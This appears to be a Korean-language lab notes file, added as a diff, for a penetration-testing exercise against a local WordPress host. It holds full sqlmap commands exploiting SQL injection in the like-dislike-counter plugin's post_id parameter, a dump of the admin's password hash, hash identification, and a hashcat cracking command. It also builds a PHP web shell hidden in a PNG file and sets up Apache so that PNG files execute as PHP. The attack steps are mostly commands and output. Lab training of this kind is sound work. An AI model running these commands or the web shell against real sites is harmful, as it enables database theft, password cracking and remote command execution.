@@ -1,0 +1,114 @@
+#모의해킹 사이트
+#http://192.168.0.104/
+
+#정보수집
+1. whatweb
+root@kali:~# whatweb 192.168.0.104 -v
+OS: Ubuntu Linux
+Webserver: Apahce 2.4.18
+Language: PHP
+MetaGenerator: wordpress
+
+2. wpscan
+wpscan github
+root@kali:~# gem install wpscan
+root@kali:~# wpscan --url 192.168.0.104
+
+slideshow-gallery v1.6.12
+
+like-dislike-counter-for-posts-pages-and-comments v1.2.3
+=> exploit-db.com vuln: SQLi
+
+Q) like-dislike-counter v1.2.3 플러그인에서 SQLi 취약점을 진단하고 취약한 파라미터(인자) 이름을 확인하세요.
+Hint) 파라미터의 값에 참 SQL구문과 거짓 SQL구문을 각각 서버에 전달하였을 때 페이지의 반응이 서로 다른지 확인
+http://192.168.0.104/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php
+post_id=1&up_type=like
+post_id
+
+Q) sqlmap을 이용해서 사용자 정보 테이블(wp_users)의 정보를 뽑아내세요!!
+Hint) 아래 구문 응용
+sqlmap -u "[URL]" --data "[파라미터]" -p [취약한인자] --level=[1~5] --dbs
+
+sqlmap -u "http://192.168.0.104/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php" --data "post_id=1&up_type=like" -p post_id --level=3 --dbs
+
+available databases [5]:                                                                                      
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] wordpress
+
+sqlmap -u "http://192.168.0.104/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php" --data "post_id=1&up_type=like" -p post_id -D "wordpress" --tables
+
+wp_users
+
+sqlmap -u "http://192.168.0.104/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php" --data "post_id=1&up_type=like" -p post_id -D "wordpress" -T "wp_users" --dump
+
+Database: wordpress
+Table: wp_users
+[1 entry]
++----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url | user_pass                          | user_login | user_email    | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | <blank>  | $P$BLEVpx4aaTAQatAr26ok6j6CqqhPLH/ | admin      | test@test.com | 0           | admin        | admin         | 2020-03-04 13:43:34 | <blank>             |
++----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+
+user_login: admin / user_pass: $P$BLEVpx4aaTAQatAr26ok6j6CqqhPLH/
+
+root@kali:~# hash-identifier
+HASH: $P$BLEVpx4aaTAQatAr26ok6j6CqqhPLH/
+
+Possible Hashs:
+[+]  MD5(Wordpress)
+
+onlinehashcrack.com
+https://www.onlinehashcrack.com/hash-identification.php
+
+Your hash may be one of the following:
+- Wordpress ≥ v2.6.2
+- Joomla ≥ v2.5.18
+- PHPass' Portable Hash
+
+https://hashcat.net/wiki/doku.php?id=hashcat
+
+hashcat -a 0 -m 400 -d 1 -o crack.txt passwd.txt wordlist.txt
+
+#PNG Webshell
+python3 xss2png.py -p "<?php system(\$_GET['0']);?>" -o webshell_test1.png
+
+"<?php system(\$_GET['0']);?>"
+
+root@kali:~/xss2png# python3 xss2png.py -p "<?php system(\$_GET['0']);?>" -o webshell_test2.png
+root@kali:~/xss2png# cp webshell_test2.png ~/
+
+$ cd /etc/apache2/
+$ sudo gedit apache2.conf
+
+/var/www → /var/www/html
+AllowOverride None → AllowOverride all
+
+$sudo gedit .htaccess
+
+RewriteEngine On
+AddHandler application/x-httpd-php .png
+
+$ sudo a2enmod rewrite
+$ sudo service apache2 restart
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
